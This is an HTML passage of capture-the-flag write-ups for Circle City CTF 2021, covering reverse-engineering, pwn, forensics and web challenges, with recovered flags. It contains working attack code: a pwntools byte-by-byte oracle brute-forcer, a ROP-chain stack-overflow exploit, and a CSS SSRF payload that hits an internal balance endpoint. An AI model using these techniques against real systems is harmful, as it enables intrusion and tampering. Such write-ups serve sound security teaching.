+</span><span>   </span><span style="color:#f28779;">srand</span><span>(argv[</span><span style="color:#ffcc66;">1</span><span>][</span><span style="color:#ffcc66;">0</span><span>] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">1 </span><span style="color:#f29e74;">+</span><span> argv[</span><span style="color:#ffcc66;">1</span><span>][</span><span style="color:#ffcc66;">1</span><span>] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">2 </span><span style="color:#f29e74;">+</span><span> argv[</span><span style="color:#ffcc66;">1</span><span>][</span><span style="color:#ffcc66;">2</span><span>] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">3 </span><span style="color:#f29e74;">+</span><span> argv[</span><span style="color:#ffcc66;">1</span><span>][</span><span style="color:#ffcc66;">3</span><span>] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>   </span><span style="color:#ffa759;">for</span><span>(</span><span style="color:#ffa759;">int</span><span> i </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;</span><span> i </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">100000000</span><span style="color:#ccc9c2cc;">;</span><span> i</span><span style="color:#f29e74;">++</span><span>) {
+</span><span>      </span><span style="color:#f28779;">rand</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>   }
+</span><span>   </span><span style="color:#ffa759;">if</span><span>(</span><span style="color:#f28779;">rand</span><span>() </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">195600770</span><span>) {
+</span><span>      </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>   } </span><span style="color:#ffa759;">else </span><span>{
+</span><span>      </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>   }
+</span><span>}
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>CCC{p4th_3pl0s10n_4s_a_tr4pd00r_funct10n?_0r_d1d_y0u_ch33s3_1t}
+</span></code></pre>
+<p>I think I can safely say this is cheese :)</p>
+<h1 id="artform-rev">artform (rev)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Anything can be a form of art. Even this challenge description is a form of art if I find a gallery with no standards!
+</span></code></pre>
+<p><a href="https://github.com/b01lers/circle-city-ctf-2021/raw/main/rev/artform/dist/artform">artform</a></p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span>undefined8 </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">long</span><span> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 local_38</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 uStack48</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 uStack40</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 uStack32</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> local_10</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  local_10 </span><span style="color:#f29e74;">= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  uStack40 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x625f3368745f7434</span><span style="color:#ccc9c2cc;">;
+</span><span>  uStack32 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x7d68357572</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_38 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x316c5f317b434343</span><span style="color:#ccc9c2cc;">;
+</span><span>  uStack48 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x33625f30745f336b</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">memset</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>local_38</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x41</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x20</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;You like to paint? You know what I say to that? </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">!&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>local_38)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(local_10 </span><span style="color:#f29e74;">!= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)) {
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>    </span><span style="color:#ffd580;">__stack_chk_fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>This gives me big big flag vibes. I can retrieve this with Ghidra, but it's faster to just pop it open in GDB.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>CCC{1_l1k3_t0_b34t_th3_bru5h}
+</span></code></pre>
+<h1 id="guardian-rev">guardian (rev)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>We have a really cool owl mascot, but there&#39;s no really cool owl themed movies....well actually....there&#39;s one.
+</span><span>nc 35.224.135.84 2000
+</span></code></pre>
+<p><a href="https://github.com/b01lers/circle-city-ctf-2021/raw/main/rev/guardian/dist/guardian">guardian</a></p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ ./guardian
+</span><span>!WWWWWeeu..   ..ueeWWWWW!
+</span><span> &quot;$$(    R$$e$$R    )$$&quot;
+</span><span>  &quot;$8oeeo. &quot;*&quot; .oeeo8$&quot;
+</span><span>  .$$#&quot;&quot;&quot;*$i i$*&quot;&quot;&quot;#$$.
+</span><span>  9$&quot; @*c $$ $$F @*c $N
+</span><span>  9$  NeP $$ $$L NeP $$
+</span><span>  `$$uuuuo$$ $$uuuuu$$&quot;
+</span><span>  x$P**$$P*$&quot;$P#$$$*R$L
+</span><span> x$$   #$k #$F :$P` &#39;#$i
+</span><span> $$     #$  #  $$     #$k
+</span><span>d$&quot;     &#39;$L   x$F     &#39;$$
+</span><span>$$      &#39;$E   9$&gt;      9$&gt;
+</span><span>$6       $F   ?$&gt;      9$&gt;
+</span><span>$$      d$    &#39;$&amp;      8$
+</span><span>&quot;$k    x$$     !$k    :$$
+</span><span> #$b  u$$L      9$b.  $$&quot;
+</span><span> &#39;#$od$#$$u....u$P$Nu@$&quot;
+</span><span> ..?$R)..?R$$$$*&quot;  #$P
+</span><span> $$$$$$$$$$$$$$@WWWW$NWWW
+</span><span> `````&quot;&quot;3$F&quot;&quot;&quot;&quot;#$F&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+</span><span>        @$.... &#39;$B
+</span><span>       d$$$$$$$$$$:
+</span><span>       
+</span><span>HOOOOOOOOOO Goes there? Do you have the password?
+</span><span> &gt;
+</span></code></pre>
+<p>The password is the flag, compared byte by byte. For each correct byte it will display a check mark. Since that means we know if each individual character is correct or not, we can bruteforce it in 95*len instead of 256^len.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>&gt; CCC
+</span><span>✅  ✅  ✅  
+</span><span>Hoo hoo hoo!
+</span><span>That is incorrect, my guardian.
+</span></code></pre>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">from </span><span>string </span><span style="color:#ffa759;">import </span><span>printable
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;guardian&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;35.224.135.84&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2000</span><span>)
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        </span><span style="color:#ffa759;">return </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    known </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;CCC{let_m3_thr0ugh!_let_me_p4ss!_d0_y0u_th1nk_y0u_c4n_h3lp_h3r&quot;
+</span><span>    </span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>        </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span>printable:
+</span><span>            r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;Goes there? Do you have the password?</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(known </span><span style="color:#f29e74;">+ </span><span>i)
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;trying &quot; </span><span style="color:#f29e74;">+ </span><span>known </span><span style="color:#f29e74;">+ </span><span>i)
+</span><span>            resp_line </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;H&quot;</span><span>)[</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">:</span><span>][</span><span style="color:#ccc9c2cc;">:</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
+</span><span>            </span><span style="color:#ffa759;">if </span><span>resp_line</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">count</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\xe2\x9c\x85</span><span style="color:#bae67e;">&quot;</span><span>) </span><span style="color:#f29e74;">!= </span><span style="color:#f28779;">len</span><span>(known) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>:
+</span><span>                </span><span style="color:#ffa759;">continue
+</span><span>            known </span><span style="color:#f29e74;">+= </span><span>i
+</span><span>            </span><span style="color:#ffa759;">break
+</span><span>        </span><span style="color:#f28779;">print</span><span>(known)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>CCC{let_m3_thr0ugh!_let_me_p4ss!_d0_y0u_th1nk_y0u_c4n_h3lp_h3r?}
+</span></code></pre>
+<h1 id="weird-rop-pwn">weird rop (pwn)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>I put my ROP Gadgets through the wash with my nice sweater and they all came out pink. I hope they still.
+</span><span>work.
+</span><span>nc 35.224.135.84 1000
+</span></code></pre>
+<p><a href="https://github.com/b01lers/circle-city-ctf-2021/raw/main/pwn/weird-rop/dist/weird-rop">weird-rop</a></p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ checksec weird-rop
+</span><span>[*] &#39;/home/sky/circle-city-ctf/weird_rop/weird-rop&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    No RELRO
+</span><span>    Stack:    No canary found
+</span><span>    NX:       NX disabled
+</span><span>    PIE:      No PIE (0x400000)
+</span><span>    RWX:      Has RWX segments
+</span></code></pre>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">vuln</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">char</span><span> cStack16</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined uStack15</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">open</span><span>(flag</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  cStack16 </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffa759;">char</span><span>)iVar1 </span><span style="color:#f29e74;">+ </span><span style="color:#bae67e;">&#39;0&#39;</span><span style="color:#ccc9c2cc;">;
+</span><span>  uStack15 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">10</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffd580;">write</span><span>(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>cStack16</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>stack0xfffffffffffffff8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">200</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>so this program does 3 things:</p>
+<ol>
+<li>open up flag.txt</li>
+<li>write the return value of open + '0' to stdout</li>
+<li>read 200 bytes onto the stack</li>
+</ol>
+<p>The read is trivially a very big buffer overflow on the stack, allowing me to control RIP. The written character is also important -- it is the ascii value corresponding to the file descriptor of flag.txt. For whatever reason this is 5 on the server and 3 locally.</p>
+<p>From the name and challenge description I can expect we'll be missing the usual pop etc gadgets and will have to do something more convoluted to control arguments. A quick search with ropper shows this is partially the case. We have gadgets to control RAX, RSI, and RDX, but nothing to allow direct control of RDI. What we do have is a ton of xor RDI, constant gadgets. We'll be using these XOR gadgets to set RDI equal to the flag file descriptor. There are gadgets for XOR RDI, 0x53 and XOR RDI, 0x56 so I use those.</p>
+<p>At this point, we have all the pieces and just need to put them together.</p>
+<ol>
+<li>read flag fd into some memory (I picked writeable binary area because PIE is off and the address is static)</li>
+<li>write flag from that address to stdout.</li>
+</ol>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;weird-rop&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;35.224.135.84&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1000</span><span>)
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        </span><span style="color:#ffa759;">return </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>
+</span><span>    mov_rax_1_ret </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x000000000040100a
+</span><span>    mov_rax_0_ret </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0000000000401002
+</span><span>    mov_rdi_1_ret </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0000000000401012
+</span><span>    pop_rdx_ret </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x00000000004010de
+</span><span>    pop_rsi_ret </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0000000000401000
+</span><span>    xor_rdi_53 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x000000000040107c
+</span><span>    xor_rdi_56 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x000000000040101a
+</span><span>    syscall_ret </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x00000000004010db
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">24
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(mov_rax_0_ret)
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(pop_rsi_ret) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#ffcc66;">0x0000000000402010</span><span>)
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(xor_rdi_53) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(xor_rdi_56)
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(pop_rdx_ret) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#ffcc66;">0x30</span><span>)
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(syscall_ret)
+</span><span>
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(mov_rax_1_ret)
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(mov_rdi_1_ret)
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(pop_rsi_ret) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#ffcc66;">0x0000000000402010</span><span>)
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(pop_rdx_ret) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#ffcc66;">0x30</span><span>)
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(syscall_ret)
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#ffcc66;">0x00401154</span><span>) </span><span style="font-style:italic;color:#5c6773;"># main
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>CCC{math_is_hard_1234897}
+</span></code></pre>
+<h1 id="double-misc-forensics">double (misc/forensics)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>I saved the flag in a Docker container, but where did Docker actually store it?
+</span></code></pre>
+<p><a href="https://github.com/b01lers/circle-city-ctf-2021/raw/main/forensics/double/dist/dump.mem.tar.xz">dump.mem.tar.xz</a>
+<a href="https://github.com/b01lers/circle-city-ctf-2021/raw/main/forensics/double/dist/Ubuntu_5.4.0-62-generic_profile.zip">Ubuntu_5.4.0-64-generic_profile.zip</a></p>
+<p>Docker stores (by default at least) files in an overlay fs.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ python2 ~/tools/volatility/vol.py -f dump.mem --profile=LinuxUbuntu_5_4_0-62-generic_profilex64 linux_psaux
+</span><span>Volatility Foundation Volatility Framework 2.6.1
+</span><span>Pid    Uid    Gid    Arguments                                                                                                
+</span><span>11560  0      0      sudo -s                                                         
+</span><span>11561  0      0      /bin/bash                                                       
+</span><span>11568  0      0      docker run -it alpine:3.7 /bin/sh                               
+</span><span>11604  0      0      /usr/bin/containerd-shim-runc-v2 -namespace moby -id e4af91e1e1bdb71af00437bf9503d5ef97ebf4406343d7778f1b9a52cdaeaa03 -address /run/containerd/containerd.sock
+</span><span>11626  0      0      /bin/sh                                                         
+</span><span>11670  0      0      vi secret.txt                                                   
+</span><span>11779  1000   1000   /usr/bin/python3 /usr/bin/update-manager --no-update --no-focus-on-map
+</span></code></pre>
+<p>Volatility can often recover files, so let's try that.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ python2 ~/tools/volatility/vol.py -f dump.mem --profile=LinuxUbuntu_5_4_0-62-generic_profilex64 linux_enumerate_files | grep secret
+</span><span>Volatility Foundation Volatility Framework 2.6.1
+</span><span>0xffffa0f6fadd78c8                    289058 /var/lib/docker/overlay2/0302e6c324b486a627e0243c020d8a7d5edd1eab9f186af5d0f6a83b5b82c989/diff/secret.txt
+</span><span>               0x0 ------------------------- /var/lib/docker/overlay2/0302e6c324b486a627e0243c020d8a7d5edd1eab9f186af5d0f6a83b5b82c989-init/diff/secret.txt
+</span><span>               0x0 ------------------------- /var/lib/docker/overlay2/c6010ae8b5857ab4d731cead4147b7d55b6ed8f985d5cbd975cfa529d2d75e30/diff/secret.txt
+</span><span>0xffffa0f6fa676360                    142019 /usr/lib/x86_64-linux-gnu/libsecret-1.so.0.0.0
+</span><span>0xffffa0f6fa99bb40                    289058 /var/lib/docker/overlay2/0302e6c324b486a627e0243c020d8a7d5edd1eab9f186af5d0f6a83b5b82c989/merged/secret.txt
+</span><span>
+</span><span>❯ python2 ~/tools/volatility/vol.py -f dump.mem --profile=LinuxUbuntu_5_4_0-62-generic_profilex64 linux_find_file -i 0xffffa0f6fadd78c8 -O secret.txt
+</span><span>Volatility Foundation Volatility Framework 2.6.1
+</span><span>
+</span><span>❯ cat secret.txt
+</span><span>C C C { d 0 c k 3 r _ i n _ a _ V M }
+</span></code></pre>
+<h1 id="casino-web">casino (web)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Can you make $1000 off Casino#4970? (say !help to view commands) 
+</span></code></pre>
+<p><a href="https://github.com/b01lers/circle-city-ctf-2021/blob/main/web/casino/dist/casino.zip">casino</a></p>
+<pre data-lang="js" style="background-color:#212733;color:#ccc9c2;" class="language-js "><code class="language-js" data-lang="js"><span>app</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">get</span><span>(</span><span style="color:#bae67e;">&#39;/set_balance&#39;</span><span style="color:#ccc9c2cc;">, </span><span>internal</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">async </span><span>(</span><span style="color:#ffcc66;">req</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">res</span><span>) </span><span style="color:#ffa759;">=&gt; </span><span>{
+</span><span>  </span><span style="color:#ffa759;">const </span><span>user </span><span style="color:#f29e74;">= </span><span>req</span><span style="color:#f29e74;">.</span><span>query</span><span style="color:#f29e74;">.</span><span>user
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(user </span><span style="color:#f29e74;">=== </span><span style="color:#ffcc66;">undefined </span><span style="color:#f29e74;">|| </span><span>user</span><span style="color:#f29e74;">.</span><span>length </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">64</span><span>) {
+</span><span>    </span><span style="color:#ffa759;">return </span><span>res</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">status</span><span>(</span><span style="color:#ffcc66;">400</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">json</span><span>({ error</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&#39;Invalid user string&#39; </span><span>})
+</span><span>  }
+</span><span>
+</span><span>  </span><span style="color:#ffa759;">const </span><span>balance </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">parseInt</span><span>(req</span><span style="color:#f29e74;">.</span><span>query</span><span style="color:#f29e74;">.</span><span>balance)
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f28779;">isNaN</span><span>(balance)) {
+</span><span>    </span><span style="color:#ffa759;">return </span><span>res</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">status</span><span>(</span><span style="color:#ffcc66;">400</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">json</span><span>({ error</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&#39;Invalid balance&#39; </span><span>})
+</span><span>  }
+</span><span>
+</span><span>  </span><span style="color:#ffa759;">await </span><span style="color:#ffd580;">setBalance</span><span>(user</span><span style="color:#ccc9c2cc;">, </span><span>balance)
+</span><span>  </span><span style="color:#ffa759;">return </span><span>res</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">status</span><span>(</span><span style="color:#ffcc66;">200</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">end</span><span>()
+</span><span>})
+</span></code></pre>
+<p>We can set our balance with a GET request. A middleware (internal) means we can't call it directly because we aren't on the docker network, but this sure sounds like GET ssrf. The vulnerability is in the $badge command -- it will style your profile pic and balance, and allow you to provide CSS for it. CSS can make GET requests in a number of ways -- a payload like this will work.</p>
+<pre data-lang="css" style="background-color:#212733;color:#ccc9c2;" class="language-css "><code class="language-css" data-lang="css"><span style="color:#73d0ff;">body </span><span>{
+</span><span>    </span><span style="color:#5ccfe6;">background-image</span><span style="color:#ccc9c2cc;">: </span><span style="color:#f28779;">url</span><span>(</span><span style="color:#bae67e;">&quot;http://172.16.0.10:3000/set_balance?user=sky%230004&amp;balance=10000&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>After that you can just get the flag by way of $flag.</p>
